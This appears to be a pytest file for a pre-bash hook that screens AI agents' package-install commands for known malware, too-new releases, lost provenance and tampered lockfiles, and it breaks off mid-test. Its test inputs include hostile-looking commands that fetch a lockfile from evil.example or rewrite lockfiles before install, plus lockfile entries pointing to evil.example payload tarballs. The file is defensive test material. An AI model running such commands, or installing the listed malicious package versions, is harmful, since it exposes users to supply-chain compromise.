"""Malware, release-age, provenance and lockfile checks in the pre-bash hook.

OSV, the registries and the ca9 engine are replaced by ``FakeSources``; the
registry existence check is stubbed. Expected decisions were written before
the code ran (see the fix record for SKY-D222/D225 hook supply chain).
"""

from __future__ import annotations

import io
import json
import sys
import types
from pathlib import Path

import pytest

from skylos.commands import hook_locked_packages, hook_supply_chain
from skylos.commands.hook_cmd import HookDeps, run_hook_command
from skylos.commands.hook_package_versions import pick_npm_version, pick_pypi_version
from skylos.commands.hook_supply_chain import Sources

CHALK_MAL = ("npm", "chalk", "5.6.1")
MALWARE = {
    CHALK_MAL: ["MAL-2025-46969"],
    ("npm", "debug", "4.4.2"): ["GHSA-4x49-vf9v-38px", "MAL-2025-46974"],
    ("npm", "@ctrl/tinycolor", "4.1.1"): ["MAL-2025-47141"],
    ("PyPI", "aiocpa", "0.1.13"): ["GHSA-486g-47cc-8wxf", "MAL-2024-11518", "PYSEC-2024-152"],
    ("PyPI", "evil-pkg", "1.0"): ["MAL-2099-1"],
    ("npm", "lodash", "4.17.15"): ["GHSA-p6mc-m468-83gw"],
    ("npm", "xrpl", "4.2.1"): ["GHSA-33qr-m49q-rxfx"],
    ("npm", "fresh", "1.9.0"): ["MAL-2099-2"],
}
RECORDS = {
    "GHSA-p6mc-m468-83gw": {"id": "GHSA-p6mc-m468-83gw", "database_specific": {"cwe_ids": ["CWE-1321"]}},
    "GHSA-33qr-m49q-rxfx": {"id": "GHSA-33qr-m49q-rxfx", "database_specific": {"cwe_ids": ["CWE-506"]}},
}
LOCKFILE = {
    "name": "f1", "version": "1.0.0", "lockfileVersion": 3, "requires": True,
    "packages": {
        "": {"name": "f1", "version": "1.0.0",
             "dependencies": {"chalk": "5.6.1", "debug": "4.4.2", "@ctrl/tinycolor": "4.1.1",
                              "ansi-styles": "6.2.1"}},
        "node_modules/chalk": {"version": "5.6.1",
                               "resolved": "https://registry.npmjs.org/chalk/-/chalk-5.6.1.tgz"},
        "node_modules/debug": {"version": "4.4.2",
                               "resolved": "https://registry.npmjs.org/debug/-/debug-4.4.2.tgz"},
        "node_modules/@ctrl/tinycolor": {
            "version": "4.1.1",
            "resolved": "https://registry.npmjs.org/@ctrl/tinycolor/-/tinycolor-4.1.1.tgz"},
        "node_modules/ansi-styles": {
            "version": "6.2.1",
            "resolved": "https://registry.npmjs.org/ansi-styles/-/ansi-styles-6.2.1.tgz"},
    },
}  # fmt: skip


class FakeSources(Sources):
    def __init__(self, *, osv_down=False, feed=None, ages=None, provenance=None,
                 packuments=None, projects=None):  # fmt: skip
        self.osv_down = osv_down
        self.feed = feed
        self.ages = ages or {}
        self.provenance_answers = provenance or {}
        self.packuments = packuments or {}
        self.projects = projects or {}
        self.queried: list[tuple[str, str, str]] = []
        self.age_calls: list[tuple[str, str, int]] = []

    def osv_batch(self, keys, deadline):
        self.queried.extend(keys)
        if self.osv_down:
            return None
        return [MALWARE.get(key, []) for key in keys]

    def osv_record(self, advisory_id, deadline):
        return RECORDS.get(advisory_id)

    def npm_packument(self, name, deadline):
        return self.packuments.get(name)

    def pypi_project(self, name, deadline):
        return self.projects.get(name)

    def release_age(self, ecosystem, name, version, min_hours):
        self.age_calls.append((name, version, min_hours))
        return self.ages.get((name, version), {"status": "old_enough"})

    def provenance(self, ecosystem, name, version):
        return self.provenance_answers.get((name, version), {"status": "ok"})

    def feed_malware(self, keys):
        return self.feed


@pytest.fixture(autouse=True)
def registry(monkeypatch):
    monkeypatch.setattr("skylos.commands.hook_install_parse._global_bin_dirs", list)
    statuses: dict[str, str] = {}
    monkeypatch.setattr(
        "skylos.rules.ai_defect.install_command.check_install_package_status",
        lambda ecosystem, name, version, cache: statuses.get(name, "present"),
    )
    return statuses


@pytest.fixture
def project(tmp_path) -> Path:
    root = tmp_path / "proj"
    (root / ".git").mkdir(parents=True)
    return root


def hook(project, command, sources, *, client="claude", pyproject=None):
    if pyproject is not None:
        (project / "pyproject.toml").write_text(pyproject)  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    payload = {"session_id": "s1", "tool_name": "Bash",
               "tool_input": {"command": command}, "cwd": str(project)}  # fmt: skip
    if client == "codex":
        payload["turn_id"] = "t1"
    stdout = io.StringIO()
    deps = HookDeps(
        env={"CLAUDE_PROJECT_DIR": str(project), "HOME": str(project / "h")},
        supply_chain_sources=sources,
    )
    run_hook_command(["pre-bash", "--client", client], stdin=io.StringIO(json.dumps(payload)),
                     stdout=stdout, deps=deps)  # fmt: skip
    text = stdout.getvalue().strip()
    if not text:
        return "allow", ""
    data = json.loads(text)
    spec = data.get("hookSpecificOutput") or {}
    if "permissionDecision" not in spec:
        return "allow", data.get("systemMessage", "")
    return spec["permissionDecision"], spec["permissionDecisionReason"]


def packument(latest, *versions):
    return {"dist-tags": {"latest": latest}, "versions": {v: {} for v in versions}}


# --------------------------------------------------------------------------
# explicit installs: malware
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "command, advisory",
    [
        ("npm install chalk@5.6.1", "MAL-2025-46969"),
        ("pip install aiocpa==0.1.13", "MAL-2024-11518"),
        ("npm i c@npm:chalk@5.6.1", "MAL-2025-46969"),
        ("pip install AIOCPA==0.1.13", "MAL-2024-11518"),
        ("pip install Evil_Pkg==1.0", "MAL-2099-1"),
        ("npx -y xrpl@4.2.1", "GHSA-33qr-m49q-rxfx"),
    ],
)
def test_known_malware_is_blocked(project, command, advisory):
    decision, reason = hook(project, command, FakeSources())
    assert decision == "deny"
    assert "known malware" in reason and advisory in reason
    assert "rotate any credentials" in reason


def test_removed_malicious_version_reports_malware_not_a_missing_version(project, registry):
    registry["chalk"] = "missing_version"
    decision, reason = hook(project, "npm install chalk@5.6.1", FakeSources())
    assert decision == "deny"
    assert "known malware" in reason and "has no version" not in reason


def test_clean_version_and_ordinary_cves_are_allowed(project):
    sources = FakeSources()
    assert hook(project, "npm install chalk@5.3.0", sources) == ("allow", "")
    assert hook(project, "npm install lodash@4.17.15", sources) == ("allow", "")
    assert ("npm", "chalk", "5.3.0") in sources.queried


def test_allowlisted_alias_name_does_not_allow_the_real_package(project):
    pyproject = '[tool.skylos]\nhooks_allow_packages = ["c"]\n'
    decision, _ = hook(project, "npm i c@npm:chalk@5.6.1", FakeSources(), pyproject=pyproject)
    assert decision == "deny"


def test_allowlisted_package_skips_every_check(project):
    pyproject = '[tool.skylos]\nhooks_allow_packages = ["npm:fresh"]\n'
    sources = FakeSources(ages={("fresh", "2.0.0"): {"status": "too_new", "age_hours": 2}},
                          packuments={"fresh": packument("2.0.0", "1.9.0", "2.0.0")})  # fmt: skip
    assert hook(project, "npm install fresh", sources, pyproject=pyproject) == ("allow", "")
    assert sources.queried == [] and sources.age_calls == []


def test_unpinned_install_checks_the_version_the_manager_resolves(project):
    sources = FakeSources(packuments={"chalk": packument("5.6.1", "5.3.0", "5.6.1")})
    decision, reason = hook(project, "npm install chalk", sources)
    assert decision == "deny" and "5.6.1" in reason
    assert CHALK_MAL in sources.queried
    tagged = {"dist-tags": {"latest": "5.3.0", "next": "5.6.1"},
              "versions": {"5.3.0": {}, "5.6.1": {}}}  # fmt: skip
    decision, _ = hook(project, "npm install chalk --tag next", FakeSources(packuments={"chalk": tagged}))
    assert decision == "deny"


def test_osv_down_without_feed_uses_on_unverified(project):
    sources = FakeSources(osv_down=True)
    decision, reason = hook(project, "npm i left-pad@1.3.0", sources)
    assert decision == "ask" and "malware check unavailable" in reason
    assert hook(project, "npm i left-pad@1.3.0", sources, client="codex")[0] == "deny"
    pyproject = '[tool.skylos.hooks]\non_unverified = "deny"\n'
    assert hook(project, "npm i left-pad@1.3.0", sources, pyproject=pyproject)[0] == "deny"


def test_osv_down_falls_back_to_the_ca9_feed(project):
    match = {"signal_type": "malware", "action": "block", "ecosystem": "npm", "name": "chalk",
             "version": "5.6.1", "evidence": {"malware_id": "MAL-2025-46969"}}  # fmt: skip
    ready = FakeSources(osv_down=True, feed={"state": "ready", "matches": [match]})
    decision, reason = hook(project, "npm i chalk@5.6.1 left-pad@1.3.0", ready)
    assert decision == "deny" and "ca9 feed" in reason and "left-pad" not in reason
    stale = FakeSources(osv_down=True, feed={"state": "stale", "matches": []})
    assert hook(project, "npm i left-pad@1.3.0", stale)[0] == "ask"


def test_block_malware_off_still_asks(project):
    pyproject = "[tool.skylos.supply_chain]\nblock_malware = false\n"
    decision, reason = hook(project, "npm install chalk@5.6.1", FakeSources(), pyproject=pyproject)
    assert decision == "ask" and "block_malware is off" in reason


# --------------------------------------------------------------------------
# explicit installs: release age and provenance
# --------------------------------------------------------------------------


def fresh_sources(suggested="1.9.0"):
    return FakeSources(
        packuments={"fresh": packument("2.0.0", "1.8.0", "1.9.0", "2.0.0")},
        ages={("fresh", "2.0.0"): {"status": "too_new", "age_hours": 2.4,
                                    "suggested_version": suggested}},
    )  # fmt: skip


def test_version_younger_than_the_cooldown_is_blocked_with_an_older_version(project):
    decision, reason = hook(project, "npm install fresh", fresh_sources(suggested="1.8.0"))
    assert decision == "deny"
    assert "published 2 hours ago" in reason and "wait 48 hours" in reason
    assert "Install fresh@1.8.0 instead" in reason
    assert "min_release_age_hours" in reason and "0 turns it off" in reason


def test_malicious_suggestion_is_not_offered(project):
    decision, reason = hook(project, "npm install fresh", fresh_sources(suggested="1.9.0"))
    assert decision == "deny"
    assert "fresh@1.9.0" not in reason and "no older version" in reason


def test_cooldown_zero_turns_the_age_check_off(project):
    sources = fresh_sources()
    pyproject = "[tool.skylos.supply_chain]\nmin_release_age_hours = 0\n"
    assert hook(project, "npm install fresh", sources, pyproject=pyproject) == ("allow", "")
    assert sources.age_calls == []


def test_invalid_cooldown_keeps_the_default_and_says_so(project):
    pyproject = '[tool.skylos.supply_chain]\nmin_release_age_hours = "0"\n'
    decision, reason = hook(project, "npm install fresh", fresh_sources(suggested="1.8.0"),
                            pyproject=pyproject)  # fmt: skip
    assert decision == "deny" and "wait 48 hours" in reason
    assert "supply-chain policy problem" in reason and "min_release_age_hours" in reason


def test_cooldown_window_comes_from_policy(project):
    sources = FakeSources(projects={"requests": {"releases": {"2.31.0": [{}], "2.32.0": [{}]}}})
    pyproject = "[tool.skylos.supply_chain]\nmin_release_age_hours = 72\n"
    assert hook(project, "pip install requests", sources, pyproject=pyproject) == ("allow", "")
    assert sources.age_calls == [("requests", "2.32.0", 72)]


def test_provenance_regression_is_blocked_and_unknown_is_not(project):
    regressed = FakeSources(provenance={("lib", "3.0.0"): {
        "status": "regressed", "evidence": {"previous_with_provenance": ["2.9.0"]}}})  # fmt: skip
    decision, reason = hook(project, "npm install lib@3.0.0", regressed)
    assert decision == "deny" and "no provenance attestation" in reason and "2.9.0" in reason
    unknown = FakeSources(provenance={("lib", "3.0.0"): {"status": "unknown"}})
    assert hook(project, "npm install lib@3.0.0", unknown) == ("allow", "")


def test_missing_engine_is_unverified_not_allowed(project):
    class NoEngine(FakeSources):
        def release_age(self, *args, **kwargs):
            return {"status": "engine_missing"}

    decision, reason = hook(project, "npm install lib@3.0.0", NoEngine())
    assert decision == "ask" and "installed ca9 cannot check it" in reason


def test_private_registry_package_is_not_sent_to_public_sources(project):
    pyproject = '[tool.skylos.hooks]\ntrusted_registries = ["https://npm.corp.example"]\n'
    sources = FakeSources()
    command = "npm install --registry https://npm.corp.example internal@1.0.0"
    assert hook(project, command, sources, pyproject=pyproject) == ("allow", "")
    assert sources.queried == []


@pytest.mark.parametrize(
    "pyproject, synced",
    [
        ('[tool.skylos.supply_chain]\nprivate_registries = ["https://npm.corp.example"]\n', None),
        (None, "supply_chain:\n  trusted_registries: ['https://npm.corp.example']\n"),
    ],
)
def test_supply_chain_registries_keep_internal_packages_off_public_sources(project, pyproject, synced):
    if synced is not None:
        (project / ".skylos").mkdir(exist_ok=True)
        (project / ".skylos" / "config.yaml").write_text(synced)  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    sources = FakeSources()
    command = "npm install --registry https://npm.corp.example internal@1.0.0"
    assert hook(project, command, sources, pyproject=pyproject) == ("allow", "")
    assert sources.queried == []


def test_public_install_is_still_checked_when_a_private_registry_is_configured(project):
    pyproject = '[tool.skylos.supply_chain]\nprivate_registries = ["https://npm.corp.example"]\n'
    decision, reason = hook(project, "npm install chalk@5.6.1", FakeSources(), pyproject=pyproject)
    assert decision == "deny" and "known malware" in reason


# --------------------------------------------------------------------------
# lockfile installs
# --------------------------------------------------------------------------


def test_npm_ci_blocks_malware_in_the_lockfile(project):
    (project / "package-lock.json").write_text(json.dumps(LOCKFILE))  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    decision, reason = hook(project, "npm ci", FakeSources())
    assert decision == "deny" and "3 package versions are known malware" in reason
    for name in ("chalk", "debug", "@ctrl/tinycolor"):
        assert f"'{name}'" in reason
    assert "ansi-styles" not in reason and "package-lock.json" in reason


def test_clean_lockfile_is_allowed(project):
    clean = json.loads(json.dumps(LOCKFILE))
    clean["packages"] = {key: value for key, value in clean["packages"].items()
                         if key in ("", "node_modules/ansi-styles")}  # fmt: skip
    (project / "package-lock.json").write_text(json.dumps(clean))  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    sources = FakeSources()
    assert hook(project, "cd . && npm install", sources) == ("allow", "")
    assert ("npm", "ansi-styles", "6.2.1") in sources.queried


def test_requirements_include_is_followed(project):
    (project / "requirements.txt").write_text("requests==2.31.0\n-r other.txt\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    (project / "other.txt").write_text("aiocpa==0.1.13\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    decision, reason = hook(project, "pip install -r requirements.txt", FakeSources())
    assert decision == "deny" and "aiocpa" in reason and "other.txt" in reason


def test_requirements_written_by_the_same_command_are_not_passed(project):
    command = "echo aiocpa==0.1.13 > r.txt && pip install -r r.txt"
    decision, reason = hook(project, command, FakeSources())
    assert decision == "ask" and "does not exist yet" in reason


def test_lockfile_over_the_limit_reports_the_rest(project, monkeypatch):
    monkeypatch.setattr(hook_locked_packages, "MAX_LOCKED_PACKAGES", 2)
    clean = json.loads(json.dumps(LOCKFILE))
    for name in ("chalk", "debug", "@ctrl/tinycolor"):
        del clean["packages"][f"node_modules/{name}"]
    for name in ("left-pad", "zod"):
        clean["packages"][f"node_modules/{name}"] = {
            "version": "1.3.0", "resolved": f"https://registry.npmjs.org/{name}/-/{name}-1.3.0.tgz"}
    (project / "package-lock.json").write_text(json.dumps(clean))  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    decision, reason = hook(project, "npm ci", FakeSources())
    assert decision == "ask" and "1 of 3 locked packages not checked" in reason


def test_lockfile_osv_down_without_feed_is_unverified(project):
    (project / "package-lock.json").write_text(json.dumps(LOCKFILE))  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    decision, reason = hook(project, "npm ci", FakeSources(osv_down=True))
    assert decision == "ask" and "4 of 4 locked packages not checked" in reason


# --------------------------------------------------------------------------
# helpers with their own contracts
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "requested, expected",
    [("", "5.3.0"), ("latest", "5.3.0"), ("next", "6.0.0-beta.1"), ("^5", "5.3.0"),
     ("^5.3.1", "5.4.0"), ("~4.9", "4.9.0"), ("4.x || 5.4", "4.9.0"), ("^7", None),
     ("not a range!", None)],
)  # fmt: skip
def test_npm_picks_like_npm(requested, expected):
    document = {
        "dist-tags": {"latest": "5.3.0", "next": "6.0.0-beta.1"},
        "versions": {"4.9.0": {}, "5.2.0": {}, "5.3.0": {}, "5.4.0": {"deprecated": "x"},
                     "6.0.0-beta.1": {}},
    }  # fmt: skip
    assert pick_npm_version(document, requested) == expected


@pytest.mark.parametrize(
    "requested, expected",
    [("", "1.0"), (">=1,<2", "1.0"), (">=2.0b1", "2.0b1"), ("^0.9", "0.9"), ("~=0.9", "0.9")],
)
def test_pypi_picks_like_pip(requested, expected):
    document = {"releases": {"0.9": [{}], "1.0": [{"yanked": False}], "1.1": [{"yanked": True}],
                             "2.0b1": [{}], "1.0.1": []}}  # fmt: skip
    assert pick_pypi_version(document, requested) == expected


def test_withdrawn_malware_record_is_not_malicious():
    assert hook_supply_chain.advisory_is_malicious({"id": "MAL-1", "withdrawn": "2025-01-01"}) is False
    assert hook_supply_chain.advisory_is_malicious(
        {"id": "GHSA-x", "database_specific": {"malicious-packages-origins": [{}]}}
    )


@pytest.mark.parametrize("api_version", [None, 0])
def test_engine_without_api_version_one_reads_as_missing(monkeypatch, api_version):
    fake = types.ModuleType("ca9.api")
    if api_version is not None:
        fake.API_VERSION = api_version
    fake.check_release_age = lambda *a, **k: {"status": "too_new"}
    monkeypatch.setitem(sys.modules, "ca9.api", fake)
    monkeypatch.setattr(sys.modules["ca9"], "api", fake, raising=False)
    assert Sources().release_age("npm", "x", "1.0.0", 24) == {"status": "engine_missing"}


def test_engine_api_errors_read_as_unknown(monkeypatch):
    fake = types.ModuleType("ca9.api")
    fake.API_VERSION = 1

    def broken(*args, **kwargs):
        raise RuntimeError("boom")

    fake.check_release_age = broken
    fake.check_provenance = broken
    monkeypatch.setitem(sys.modules, "ca9.api", fake)
    monkeypatch.setattr(sys.modules["ca9"], "api", fake, raising=False)
    assert Sources().release_age("npm", "x", "1.0.0", 24) == {"status": "unknown"}
    assert Sources().provenance("npm", "x", "1.0.0") == {"status": "unknown"}
    assert Sources().provenance("npm", "x", "1.0.0")["status"] != "regressed"


def _real_engine():
    try:
        from ca9 import api
    except ImportError:
        return None
    if getattr(api, "API_VERSION", 0) < 1:
        return None
    if not all(hasattr(api, name) for name in ("check_release_age", "malware_matches",
                                                  "check_provenance")):  # fmt: skip
        return None
    return api


@pytest.mark.skipif(_real_engine() is None, reason="ca9.api (API_VERSION >= 1) not installed")
def test_real_engine_answers_in_the_contract_shape():
    sources = Sources()
    age = sources.release_age("npm", "chalk", "5.3.0", 24)
    assert age.get("status") in {"old_enough", "too_new", "unknown", "engine_missing"}
    provenance = sources.provenance("npm", "chalk", "5.3.0")
    assert provenance.get("status") in {"ok", "regressed", "unknown", "not_applicable"}
    feed = sources.feed_malware([("npm", "chalk", "5.6.1")])
    assert feed is None or isinstance(feed.get("matches"), list)


def test_a_crash_in_the_supply_chain_stage_is_not_an_allow(project, monkeypatch):
    class Broken(FakeSources):
        def osv_batch(self, keys, deadline):
            raise RuntimeError("boom")

    def explode(*args, **kwargs):
        raise RuntimeError("boom")

    decision, reason = hook(project, "npm install chalk@5.3.0", Broken())
    assert decision == "ask" and "malware check unavailable" in reason
    monkeypatch.setattr(hook_supply_chain, "check_supply_chain", explode)
    decision, reason = hook(project, "npm install chalk@5.3.0", FakeSources())
    assert decision == "ask" and "check failed" in reason


@pytest.mark.parametrize(
    "record",
    [
        {"id": "mal-2025-1"},
        {"id": "GHSA-x", "aliases": ["mal-2025-1"]},
        {"id": "GHSA-x", "database_specific": {"cwe_ids": ["CWE-506"]}},
        {"id": "GHSA-x", "database_specific": {"cwes": [{"cweId": "CWE-506"}]}},
        {"id": "GHSA-x", "affected": [{"database_specific": {"cwe_ids": ["CWE-506"]}}]},
    ],
)
def test_hook_and_scan_agree_on_what_is_malware(record):
    assert hook_supply_chain.advisory_is_malicious(record) is True


def test_ordinary_advisory_is_not_malware():
    assert hook_supply_chain.advisory_is_malicious(
        {"id": "GHSA-x", "database_specific": {"cwe_ids": ["CWE-79"]}}
    ) is False


HEX = "a" * 64
CLOUD = ".skylos/config.yaml"


def npm_lock(project, *entries):
    packages = {"": {"name": "f", "version": "1.0.0"}}
    for name, version, resolved in entries:
        packages[f"node_modules/{name}"] = {"version": version, "resolved": resolved,
                                            "integrity": "sha512-x"}  # fmt: skip
    (project / "package.json").write_text('{"name": "f", "version": "1.0.0"}')  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    (project / "package-lock.json").write_text(json.dumps(  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
        {"name": "f", "version": "1.0.0", "lockfileVersion": 3, "requires": True,
         "packages": packages}))  # fmt: skip


def uv_lock(project, name, version, index):
    (project / "uv.lock").write_text(  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
        f'version = 1\nrequires-python = ">=3.9"\n\n[[package]]\nname = "{name}"\n'
        f'version = "{version}"\nsource = {{ registry = "{index}" }}\n'
        f'sdist = {{ url = "{index}/{name}-{version}.tar.gz", hash = "sha256:{HEX}" }}\n'
    )


def cloud(project, text):
    (project / ".skylos").mkdir(exist_ok=True)
    (project / CLOUD).write_text(text)  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path


@pytest.mark.parametrize(
    "resolved",
    ["https://artifactory.corp.example/api/npm/npm/chalk/-/chalk-5.6.1.tgz",
     "https://registry.yarnpkg.com/chalk/-/chalk-5.6.1.tgz",
     "https://registry.npmjs.org:443/chalk/-/chalk-5.6.1.tgz",
     "https://evil.example/payload.tgz"],
)  # fmt: skip
def test_locked_malware_is_checked_whatever_source_the_lockfile_records(project, resolved):
    npm_lock(project, ("chalk", "5.6.1", resolved))
    assert hook(project, "npm ci", FakeSources())[0] == "deny"


def test_locked_tarball_from_an_unknown_host_asks_even_when_its_version_is_clean(project):
    npm_lock(project, ("chalk", "5.3.0", "https://evil.example/payload.tgz"))
    decision, reason = hook(project, "npm ci", FakeSources())
    assert decision == "ask" and "tarball from evil.example" in reason
    npm_lock(project, ("chalk", "5.3.0", "https://registry.yarnpkg.com/chalk/-/chalk-5.3.0.tgz"))
    assert hook(project, "npm ci", FakeSources()) == ("allow", "")


def test_declared_registry_keeps_internal_names_private_but_not_public_ones(project):
    pyproject = ('[tool.skylos.hooks]\ntrusted_registries = ["https://npm.corp.example"]\n'
                 '[tool.skylos.supply_chain]\ninternal_packages = ["@corp/*"]\n')  # fmt: skip
    (project / "pyproject.toml").write_text(pyproject)  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    npm_lock(project, ("@corp/ui", "1.0.0", "https://npm.corp.example/@corp/ui/-/ui-1.0.0.tgz"))
    sources = FakeSources()
    assert hook(project, "npm ci", sources) == ("allow", "")
    assert sources.queried == []
    npm_lock(project, ("chalk", "5.6.1", "https://npm.corp.example/chalk/-/chalk-5.6.1.tgz"))
    assert hook(project, "npm ci", FakeSources())[0] == "deny"


def test_uv_lock_from_a_private_index_is_still_checked(project):
    uv_lock(project, "evil-pkg", "1.0", "https://artifactory.corp.example/simple")
    assert hook(project, "uv sync", FakeSources())[0] == "deny"


@pytest.mark.parametrize(
    "line",
    ["--index-url https://pypi.org/simple", "--extra-index-url https://download.pytorch.org/whl/cpu",
     "--index-url https://pypi.corp.example/simple"],
)  # fmt: skip
def test_requirements_index_options_do_not_turn_the_check_off(project, line):
    (project / "requirements.txt").write_text(f"{line}\nevil-pkg==1.0\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    assert hook(project, "pip install -r requirements.txt", FakeSources())[0] == "deny"


def test_exclusive_private_index_keeps_only_internal_names_private(project):
    (project / "pyproject.toml").write_text(  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
        '[tool.skylos.supply_chain]\ninternal_packages = ["acme-*"]\n')
    (project / "requirements.txt").write_text(  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
        "--index-url https://pypi.corp.example/simple\nacme_tools==1.0\n")
    sources = FakeSources()
    assert hook(project, "pip install -r requirements.txt", sources) == ("allow", "")
    assert sources.queried == []
    (project / "requirements.txt").write_text(  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
        "--index-url https://pypi.corp.example/simple\nacme_tools==1.0\nevil-pkg==1.0\n")
    assert hook(project, "pip install -r requirements.txt", FakeSources())[0] == "deny"


def test_requirements_direct_reference_asks(project):
    (project / "requirements.txt").write_text("evil @ https://evil.example/evil-1.0-py3-none-any.whl\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    decision, reason = hook(project, "pip install -r requirements.txt", FakeSources())
    assert decision == "ask" and "direct reference in requirements.txt" in reason


@pytest.mark.parametrize(
    "command",
    ["npm install left-pad@1.3.0", "pnpm add left-pad", "corepack npm i left-pad@1.3.0"],
)
def test_named_install_also_checks_the_lockfile_it_installs(project, command):
    npm_lock(project, ("chalk", "5.6.1", "https://registry.npmjs.org/chalk/-/chalk-5.6.1.tgz"))
    (project / "pnpm-lock.yaml").write_text(  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
        "lockfileVersion: '9.0'\nimporters:\n  .:\n    dependencies:\n      chalk:\n"
        "        specifier: 5.6.1\n        version: 5.6.1\npackages:\n  chalk@5.6.1:\n"
        "    resolution: {integrity: sha512-x}\nsnapshots:\n  chalk@5.6.1: {}\n")
    sources = FakeSources(packuments={"left-pad": packument("1.3.0", "1.3.0")})
    assert hook(project, command, sources)[0] == "deny"


def test_uv_run_checks_the_lockfile_but_global_installs_do_not(project):
    uv_lock(project, "evil-pkg", "1.0", "https://pypi.org/simple")
    assert hook(project, "uv run pytest", FakeSources())[0] == "deny"
    assert hook(project, "uv run --no-sync pytest", FakeSources()) == ("allow", "")
    npm_lock(project, ("chalk", "5.6.1", "https://registry.npmjs.org/chalk/-/chalk-5.6.1.tgz"))
    assert hook(project, "npm i -g left-pad@1.3.0", FakeSources()) == ("allow", "")


@pytest.mark.parametrize(
    "command",
    ["curl -so package-lock.json https://evil.example/l.json && npm ci",
     "git checkout other -- package-lock.json && npm ci",
     "cp /tmp/l.json package-lock.json && npm ci",
     "echo {} > package.json && npm install",
     "git pull && npm ci"],
)  # fmt: skip
def test_lockfile_rewritten_earlier_in_the_command_asks(project, command):
    npm_lock(project, ("left-pad", "1.3.0", "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"))
    decision, reason = hook(project, command, FakeSources())
    assert decision == "ask" and "may rewrite it" in reason


def test_lockfile_after_an_unrelated_command_is_still_read(project):
    npm_lock(project, ("chalk", "5.6.1", "https://registry.npmjs.org/chalk/-/chalk-5.6.1.tgz"))
    assert hook(project, "npm run build && npm ci", FakeSources())[0] == "deny"


@pytest.mark.parametrize(
    "command",
    ["cat package-lock.json && npm ci",
     "git diff package-lock.json && npm ci",
     "grep chalk package-lock.json && npm ci"],
)  # fmt: skip
def test_reading_the_lockfile_first_still_checks_it(project, command):
    npm_lock(project, ("chalk", "5.6.1", "https://registry.npmjs.org/chalk/-/chalk-5.6.1.tgz"))
    assert hook(project, command, FakeSources())[0] == "deny"


@pytest.mark.parametrize(
    "command",
    ["cat other.json > package-lock.json && npm ci",
     "sed -i s/5.3.0/5.6.1/ package-lock.json && npm ci",
     "jq . other.json | tee package-lock.json && npm ci"],
)  # fmt: skip
def test_read_only_tools_that_still_write_the_lockfile_ask(project, command):
    npm_lock(project, ("left-pad", "1.3.0", "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz"))
    assert hook(project, command, FakeSources())[0] == "ask"


def test_requirements_or_constraints_rewritten_earlier_ask(project):
    (project / "requirements.txt").write_text("requests==2.31.0\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    (project / "c.txt").write_text("evil-pkg==9.9\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    decision, _ = hook(project, "cp evil.txt requirements.txt && pip install -r requirements.txt",
                       FakeSources())  # fmt: skip
    assert decision == "ask"
    projects = {"evil-pkg": {"releases": {"1.0": [{}], "9.9": [{}]}}}
    decision, _ = hook(project, "echo evil-pkg==1.0 > c.txt && pip install -c c.txt evil-pkg",
                       FakeSources(projects=projects))  # fmt: skip
    assert decision == "ask"


def test_public_mirror_in_npmrc_gets_full_checks(project):
    (project / ".npmrc").write_text("registry=https://registry.npmmirror.com/\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    sources = FakeSources(packuments={"chalk": packument("5.6.1", "5.6.1")})
    assert hook(project, "npm install chalk", sources)[0] == "deny"


def test_undeclared_private_registry_still_gets_the_malware_check(project):
    (project / ".npmrc").write_text("registry=https://npm.corp.example/\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    assert hook(project, "npm install chalk@5.6.1", FakeSources())[0] == "deny"
    decision, reason = hook(project, "npm install lib@3.0.0", FakeSources())
    assert decision == "allow" and "release age not checked" in reason
    assert "npm.corp.example is not a declared registry" in reason


def test_pip_ignores_uv_and_poetry_indexes(project):
    pyproject = ('[tool.uv]\nextra-index-url = ["https://pypi.corp.example/simple"]\n'
                 '[[tool.poetry.source]]\nname = "corp"\nurl = "https://pypi.corp.example/simple"\n')  # fmt: skip
    projects = {"evil-pkg": {"releases": {"1.0": [{}]}}}
    decision, _ = hook(project, "pip install evil-pkg", FakeSources(projects=projects),
                       pyproject=pyproject)  # fmt: skip
    assert decision == "deny"


@pytest.mark.parametrize(
    "command, setup",
    [("pip install --pre evil-pkg", None),
     ("PIP_PRE=1 pip install evil-pkg", None),
     ("pip install -c c.txt evil-pkg", "c.txt"),
     ("PIP_CONSTRAINT=c.txt pip install evil-pkg", "c.txt")],
)  # fmt: skip
def test_version_selection_follows_pre_and_constraints(project, command, setup):
    MALWARE[("PyPI", "evil-pkg", "2.0rc1")] = ["MAL-2099-3"]
    if setup:
        (project / setup).write_text("evil-pkg==1.0\n")  # skylos: ignore[SKY-D324] test fixture under pytest tmp_path
    projects = {"evil-pkg": {"releases": {"1.5": [{}], "1.0": [{}], "2.0rc1": [{}]}}}
    try:
        assert hook(project, command, FakeSources(projects=projects))[0] == "deny"
    finally:
        del MALWARE[("PyPI", "evil-pkg", "2.0rc1")]


def test_unreadable_constraints_file_is_not_checked_as_unconstrained(project):
    projects = {"evil-pkg": {"releases": {"1.5": [{}]}}}
    decision, reason = hook(project, "pip install -c missing.txt evil-pkg",
                            FakeSources(projects=projects))  # fmt: skip
    assert decision == "ask" and "could not be read" in reason


def test_npm_tag_from_env_and_npmrc_is_followed(project):
